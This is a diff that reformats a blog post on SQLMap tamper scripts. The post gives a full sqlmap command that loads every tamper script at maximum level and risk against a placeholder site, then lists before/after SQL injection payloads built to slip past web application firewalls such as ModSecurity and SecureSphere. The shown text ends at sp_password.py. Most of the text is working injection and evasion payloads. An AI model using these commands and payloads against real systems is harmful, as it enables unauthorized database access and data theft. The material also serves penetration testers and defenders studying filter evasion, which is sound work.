@@ -1,24 +1,11 @@
 # SQLMap Tamper Scripts (SQL Injection and WAF bypass) Tips | by Red C0de | Medium
 # [SQLMap Tamper Scripts (SQL Injection and WAF bypass)](https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423) Tips
 
-[![](https://miro.medium.com/fit/c/56/56/1*n7pOxhHnmJe_D-veB_IXTQ.jpeg)
-](/@drag0n?source=post_page-----c5a3f5764cb3--------------------------------)
-
-\[
-
-Red C0de
-
-](/@drag0n?source=post_page-----c5a3f5764cb3--------------------------------)
-
-\[
-
-Apr 15, 2018·4 min read
-
-](/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3?source=post_page-----c5a3f5764cb3--------------------------------)
-
 Use and load all tamper scripts to evade filters and WAF :
 
-sqlmap -u ‘[http://www.site.com/search.cmd?form_state=1](http://www.site.com:80/search.cmd?form_state=1)’ — level=5 — risk=3 -p ‘item1’ — tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+```bash
+sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+```
 
 **General Tamper testing:**
 
@@ -40,9 +27,9 @@ tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike
 
 **Platform: All**
 
-> _example_
+> example
 
-1 AND ‘1’=’1 ==> 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871
+`1 AND ‘1’=’1 ==> 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871`
 
 # **apostrophenullencode.py**
 
@@ -52,7 +39,7 @@ tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike
 
 > _example_
 
-1 AND ‘1’=’1 ==> 1 AND %00%271%00%27=%00%271
+`1 AND ‘1’=’1 ==> 1 AND %00%271%00%27=%00%271`
 
 # appendnullbyte.py
 
@@ -62,7 +49,7 @@ tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike
 
 > _example_
 
-1 AND 1=1 ==> 1 AND 1=1%00
+`1 AND 1=1 ==> 1 AND 1=1%00`
 
 # base64encode.py
 
@@ -72,7 +59,7 @@ tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike
 
 > _example_
 
-1' AND SLEEP(5)# ==> MScgQU5EIFNMRUVQKDUpIw==
+`' AND SLEEP(5)# ==> MScgQU5EIFNMRUVQKDUpIw==`
 
 # between.py
 
@@ -82,7 +69,10 @@ tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike
 
 > _example_
 
-1 AND A > B — ==> 1 AND A NOT BETWEEN 0 AND B — \`\`\`、\`\`\`1 AND A = B — ==> 1 AND A BETWEEN B AND B —
+```sql
+1 AND A > B - ==> 1 AND A NOT BETWEEN 0 AND B -
+1 AND A = B - ==> 1 AND A BETWEEN B AND B -
+```
 
 # bluecoat.py
 
@@ -92,7 +82,7 @@ tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike
 
 > _example_
 
-SELECT id FROM users WHERE id = 1 ==> SELECT%09id FROM%09users WHERE%09id LIKE 1
+`SELECT id FROM users WHERE id = 1 ==> SELECT%09id FROM%09users WHERE%09id LIKE 1`
 
 # chardoubleencode.py
 
@@ -102,7 +92,7 @@ SELECT id FROM users WHERE id = 1 ==> SELECT%09id FROM%09users WHERE%09id LIKE 1
 
 > _example_
 
-SELECT FIELD FROM%20TABLE ==> %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545
+`SELECT FIELD FROM%20TABLE ==> %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545`
 
 # charencode.py
 
@@ -112,7 +102,7 @@ SELECT FIELD FROM%20TABLE ==> %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545
 
 > _example_
 
-SELECT FIELD FROM%20TABLE ==> %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45
+`SELECT FIELD FROM%20TABLE ==> %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45`
 
 # charunicodeencode.py
 
@@ -122,7 +112,7 @@ SELECT FIELD FROM%20TABLE ==> %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4
 
 > _example_
 
-SELECT FIELD%20FROM TABLE ==> %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045
+`SELECT FIELD%20FROM TABLE ==> %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045`
 
 # commalesslimit.py
 
@@ -132,7 +122,7 @@ SELECT FIELD%20FROM TABLE ==> %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u
 
 > _example_
 
-LIMIT 2, 3 ==> LIMIT 3 OFFSET 2
+`LIMIT 2, 3 ==> LIMIT 3 OFFSET 2`
 
 # commalessmid.py
 
@@ -142,7 +132,7 @@ LIMIT 2, 3 ==> LIMIT 3 OFFSET 2
 
 > _example_
 
-MID(VERSION(), 1, 1) ==> MID(VERSION() FROM 1 FOR 1)
+`MID(VERSION(), 1, 1) ==> MID(VERSION() FROM 1 FOR 1)`
 
 # concat2concatws.py
 
@@ -152,7 +142,7 @@ MID(VERSION(), 1, 1) ==> MID(VERSION() FROM 1 FOR 1)
 
 > _example_
 
-CONCAT(1,2) ==> CONCAT_WS(MID(CHAR(0),0,0),1,2)
+`CONCAT(1,2) ==> CONCAT_WS(MID(CHAR(0),0,0),1,2)`
 
 # equaltolike.py
 
@@ -162,7 +152,7 @@ CONCAT(1,2) ==> CONCAT_WS(MID(CHAR(0),0,0),1,2)
 
 > _example_
 
-SELECT \* FROM users WHERE id=1 ==> SELECT \* FROM users WHERE id LIKE 1
+`SELECT \* FROM users WHERE id=1 ==> SELECT \* FROM users WHERE id LIKE 1`
 
 # escapequotes.py
 
@@ -172,7 +162,7 @@ SELECT \* FROM users WHERE id=1 ==> SELECT \* FROM users WHERE id LIKE 1
 
 > _example_
 
-1" AND SLEEP(5)# ==> 1\\\\\\\\” AND SLEEP(5)#
+`1" AND SLEEP(5)# ==> 1\\\\\\\\” AND SLEEP(5)#`
 
 # greatest.py
 
@@ -182,7 +172,7 @@ SELECT \* FROM users WHERE id=1 ==> SELECT \* FROM users WHERE id LIKE 1
 
 > _example_
 
-1 AND A > B ==> 1 AND GREATEST(A,B+1)=A
+`1 AND A > B ==> 1 AND GREATEST(A,B+1)=A`
 
 # halfversionedmorekeywords.py
 
@@ -192,7 +182,7 @@ SELECT \* FROM users WHERE id=1 ==> SELECT \* FROM users WHERE id LIKE 1
 
 > _example_
 
-union ==> /\*!0union
+`union ==> /\*!0union`
 
 # ifnull2ifisnull.py
 
@@ -202,7 +192,7 @@ union ==> /\*!0union
 
 > _example_
 
-IFNULL(1, 2) ==> IF(ISNULL(1),2,1)
+`IFNULL(1, 2) ==> IF(ISNULL(1),2,1)`
 
 # informationschemacomment.py
 
@@ -212,7 +202,7 @@ IFNULL(1, 2) ==> IF(ISNULL(1),2,1)
 
 > _example_
 
-SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> SELECT table_name FROM INFORMATION_SCHEMA/\*\*/.TABLES
+`SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> SELECT table_name FROM INFORMATION_SCHEMA/\*\*/.TABLES`
 
 # lowercase.py
 
@@ -222,7 +212,7 @@ SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> SELECT table_name FROM INFO
 
 > _example_
 
-SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> select table_name from information_schema.tables
+`SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> select table_name from information_schema.tables`
 
 # modsecurityversioned.py
 
@@ -232,7 +222,7 @@ SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> select table_name from info
 
 > _example_
 
-1 AND 2>1 — ==> 1 /\*!30874AND 2>1\*/ —
+`1 AND 2>1 — ==> 1 /\*!30874AND 2>1\*/ -`
 
 # multiplespaces.py
 
@@ -242,7 +232,7 @@ SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> select table_name from info
 
 > _example_
 
-1 UNION SELECT foobar ==> 1 UNION SELECT foobar
+`1 UNION SELECT foobar ==> 1 UNION SELECT foobar`
 
 # nonrecursivereplacement.py
 
@@ -252,7 +242,7 @@ SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> select table_name from info
 
 > _example_
 
-1 UNION SELECT 2 — ==> 1 UNION SELESELECTCT 2-
+`1 UNION SELECT 2 — ==> 1 UNION SELESELECTCT 2-`
 
 # overlongutf8.py
 
@@ -262,7 +252,7 @@ SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> select table_name from info
 
 > _example_
 
-SELECT FIELD FROM TABLE WHERE 2>1 ==> SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1
+`SELECT FIELD FROM TABLE WHERE 2>1 ==> SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1`
 
 # percentage.py
 
@@ -272,7 +262,7 @@ SELECT FIELD FROM TABLE WHERE 2>1 ==> SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%
 
 > _example_
 
-SELECT FIELD FROM TABLE ==> %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E
+`SELECT FIELD FROM TABLE ==> %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E`
 
 # randomcase.py
 
@@ -282,7 +272,7 @@ SELECT FIELD FROM TABLE ==> %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E
 
 > _example_
 
-INSERT ==> InseRt
+`INSERT ==> InseRt`
 
 # randomcomments.py
 
@@ -292,7 +282,7 @@ INSERT ==> InseRt
 
 > _example_
 
-INSERT ==> I / \*\* / N / \*\* / SERT
+`INSERT ==> I / \*\* / N / \*\* / SERT`
 
 # securesphere.py
 
@@ -302,7 +292,7 @@ INSERT ==> I / \*\* / N / \*\* / SERT
 
 > _example_
 
-1 AND 1=1 ==> 1 AND 1=1 and ‘0having’=’0having’
+`1 AND 1=1 ==> 1 AND 1=1 and ‘0having’=’0having’`
 
 # sp_password.py
 
